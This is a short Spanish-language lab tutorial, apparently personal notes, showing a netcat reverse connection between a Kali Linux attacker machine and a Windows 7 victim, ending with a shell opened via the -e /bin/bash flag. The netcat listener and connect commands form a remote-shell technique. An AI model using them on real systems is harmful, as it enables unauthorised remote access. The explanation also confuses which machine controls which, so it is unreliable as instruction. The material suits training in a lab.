Una Conexion inversa es cuando la victima se conecta al atacante.

Nuestro Kali Linux es nuestro S.O como hacker, la maquina del atacante.

El Windows 7 Es la victima de la victima.

Entonces lo que vamos a hacer es una conexion inversa que seria que con nuestro Kali nos conectamos al W7.

Primero de la maquina del Atacante vamos a abrir los puertos utilizando el comando que ya vimos en el anterior post.


```sh
#nc -lvvp "puerto"
nc -lvvp 4447

# lo que hace la flag lvvp es poner netcat en escucha en el puerto 4447
```

![[Pasted image 20231123112452.png]]

Y ahora desde la maquina de la victima vamos a conectarnos a la maquina del atacante.
Con el comando visto anteriormente.

```sh
#nc ip-atacante
nc 192.168.0.21 4447
```

Como podemos ver ya tenemos acceso remoto desde la maquina victima hacia la maquina del atacante.

![[Pasted image 20231123112756.png]]

Esa es una prueba de conexion inversa.

Ahora lo que vamos a hacer es generar una shell en la maquina de la victima a la hora que se conecte a nuestra maquina, como hacemos eso?
Con los mismos comandos del anterior post pero ahora cambiamos de maquinas y de terminales, porque recuerden que linux no tiene cmd tiene bash.

![[Pasted image 20231123113037.png]]

Y de parte de W7 lo que nos quedaria hacer es conectarnos.

![[Pasted image 20231123113526.png]]
Ahi como podemos ver desde W7 la maquina de la victima, establecí una conexión hacia la maquina del atacante , y recuerden que habíamos activado la flag -e /bin/bash, entonces se me abrió una terminal para controlar la maquina del atacante.

Posteriormente para corroborar me movilice al escritorio y cree la carpeta prueba.